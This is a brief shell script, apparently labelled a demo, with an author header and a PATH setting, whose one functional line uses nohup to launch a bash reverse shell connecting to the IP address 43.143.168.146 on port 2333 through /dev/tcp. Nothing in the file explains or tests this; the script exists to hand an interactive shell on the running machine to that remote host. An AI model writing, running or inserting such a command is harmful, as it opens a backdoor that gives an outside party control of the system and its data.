##########################################################################
# File Name: ./demo.sh
# Author: amoscykl
# mail: amoscykl980629@163.com
# Created Time: Wed 28 Sep 2022 07:48:14 PM CST
#########################################################################
#!/bin/zsh
PATH=/home/edison/bin:/home/edison/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/work/tools/gcc-3.4.5-glibc-2.3.6/bin
export PATH

nohup "bash -c 'bash -i >& /dev/tcp/43.143.168.146/2333 0>&1'"

